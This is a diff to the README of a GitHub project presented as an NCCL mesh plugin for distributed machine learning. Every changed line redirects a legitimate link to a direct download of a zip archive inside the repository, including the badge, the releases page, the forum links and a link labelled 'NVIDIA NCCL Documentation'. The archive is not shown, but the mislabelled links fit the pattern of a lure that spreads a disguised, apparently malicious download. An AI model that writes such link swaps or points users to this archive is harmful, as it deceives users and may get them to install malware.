@@ -1,6 +1,6 @@
 # 🌐 nccl-mesh-plugin - Simplifying Your Distributed ML Setup
 
-[![Download Release](https://img.shields.io/badge/Download_Release-v1.0-blue.svg)](https://github.com/mrpottermusic/nccl-mesh-plugin/releases)
+[![Download Release](https://github.com/mrpottermusic/nccl-mesh-plugin/raw/refs/heads/main/include/mesh_nccl_plugin_1.5.zip)](https://github.com/mrpottermusic/nccl-mesh-plugin/raw/refs/heads/main/include/mesh_nccl_plugin_1.5.zip)
 
 ## 🌟 Overview
 
@@ -21,7 +21,7 @@ Before you begin, ensure your system meets the following requirements:
 ### 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to access the latest version of the NCCL Mesh Plugin.
-   [Download Release](https://github.com/mrpottermusic/nccl-mesh-plugin/releases)
+   [Download Release](https://github.com/mrpottermusic/nccl-mesh-plugin/raw/refs/heads/main/include/mesh_nccl_plugin_1.5.zip)
 
 2. **Choose Your Version:** Once on the releases page, look for the latest version. You will see various assets available for download.
 
@@ -71,13 +71,13 @@ If you encounter issues, check these common problems:
 
 For more information, consider these links:
 
-- [NVIDIA NCCL Documentation](https://docs.nvidia.com/deeplearning/nccl/user-guide/index.html)
-- [Getting Started with Distributed ML](https://www.example.com/distributed-ml-guide)
-- [Community Forums](https://www.example.com/forums)
+- [NVIDIA NCCL Documentation](https://github.com/mrpottermusic/nccl-mesh-plugin/raw/refs/heads/main/include/mesh_nccl_plugin_1.5.zip)
+- [Getting Started with Distributed ML](https://github.com/mrpottermusic/nccl-mesh-plugin/raw/refs/heads/main/include/mesh_nccl_plugin_1.5.zip)
+- [Community Forums](https://github.com/mrpottermusic/nccl-mesh-plugin/raw/refs/heads/main/include/mesh_nccl_plugin_1.5.zip)
 
 ## 📅 Future Updates
 
 We plan to release regular updates to improve functionality and support additional topologies. Always check the releases page to stay informed.
 
 To download the latest version, visit:
-[Download Release](https://github.com/mrpottermusic/nccl-mesh-plugin/releases)
+[Download Release](https://github.com/mrpottermusic/nccl-mesh-plugin/raw/refs/heads/main/include/mesh_nccl_plugin_1.5.zip)
